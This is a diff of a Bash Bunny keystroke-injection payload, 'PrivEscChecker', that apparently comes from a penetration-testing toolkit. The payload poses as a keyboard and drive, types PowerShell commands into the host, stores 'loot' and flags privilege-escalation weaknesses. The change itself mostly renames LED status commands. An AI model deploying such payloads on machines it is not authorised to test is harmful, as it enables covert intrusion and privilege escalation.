@@ -15,10 +15,8 @@
 # Green..............Found Possible Privilege Escalation
 # Red................No Possible Privilege Escalation
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
-
-LED R 200
+LED SETUP
+GET SWITCH_POSITION
 LOOTDIR=/root/udisk/loot/PrivEscChecker
 mkdir -p $LOOTDIR
 #cleanup any prior unfinished payloads
@@ -26,7 +24,7 @@ rm $LOOTDIR/DONE
 rm $LOOTDIR/OUTPUT
 
 ATTACKMODE HID STORAGE
-LED B 200
+LED ATTACK
 
 # wait 6 seconds for the storage to popup, then open powershell and get bunny drive letter
 Q DELAY 6000
@@ -57,7 +55,7 @@ Q STRING New-Item \$Bunny\\loot\\PrivEscChecker\\DONE -type file -force -value \
 Q ENTER
 Q DELAY 100
 
-# Eject the USB Safely 
+# Eject the USB Safely
 Q STRING \$Eject \=  New-Object -comObject Shell.Application
 Q ENTER
 Q DELAY 100
@@ -68,7 +66,7 @@ Q ENTER
 
 sync
 #remount the drive and check results
-LED R B 200
+LED CLEANUP
 sleep 1
 # Wait for the DONE file to be created so we know powershell is finished
 LOOTDIR=/root/udisk/loot/PrivEscChecker
@@ -84,7 +82,7 @@ rm -f $DONEFILE
 
 # Check OUTPUT.txt for any missing patches
 if grep -lq 'Appears Vulnerable' $LOOTDIR/$DIR/OUTPUT.txt; then
-  LED G 200
-else 
-  LED R
+  LED FINISH
+else
+  LED FAIL
 fi
